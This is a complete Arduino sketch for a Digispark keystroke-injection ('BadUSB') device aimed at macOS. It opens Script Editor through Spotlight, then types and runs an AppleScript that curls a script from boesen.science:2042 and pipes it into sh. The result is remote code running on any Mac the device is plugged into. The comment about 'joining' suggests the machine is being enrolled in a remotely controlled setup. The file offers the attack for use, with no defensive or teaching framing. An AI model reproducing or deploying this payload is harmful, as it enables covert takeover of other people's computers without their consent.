#include "DigiKeyboard.h"

void setup() {
    // initialize the digital pin as an output.
    pinMode(0, OUTPUT); // LED on Model B
    pinMode(1, OUTPUT); // LED on Model A

    // Some systems require this
    DigiKeyboard.sendKeyStroke(0);

    // Turn on LED
    digitalWrite(0, HIGH);
    digitalWrite(1, HIGH);

    // Sometimes a keyboard dialog appears, this will circumvent the issue
    DigiKeyboard.delay(5000);

    DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
    DigiKeyboard.delay(100);
    DigiKeyboard.print("Script Editor");
    DigiKeyboard.delay(3000); // Sometimes Spotlight needs a bit to find what it's looking for
    DigiKeyboard.sendKeyStroke(KEY_ENTER);
    DigiKeyboard.delay(2000); // Give Script Editor a couple seconds to start up
    // Clear editor if necessary
    DigiKeyboard.sendKeyStroke(KEY_A, MOD_GUI_LEFT); // Select all
    DigiKeyboard.delay(100);
    DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT); // Cut (no key for delete)
    DigiKeyboard.delay(100);
    DigiKeyboard.println("do shell script \"curl boesen.science:2042/jm |sh\""); // Type out command to handle joining
    DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); // Run AppleScript
    // Script Editor will be killed at the end of the join script

    // Turn off LED
    digitalWrite(0, LOW);
    digitalWrite(1, LOW);

    // Ensure computer knows that keyboard is alive
    DigiKeyboard.delay(10);
}


void loop() {
    // this is generally not necessary but with some older systems it seems to
    // prevent missing the first character after a delay:
    exit(0);
}
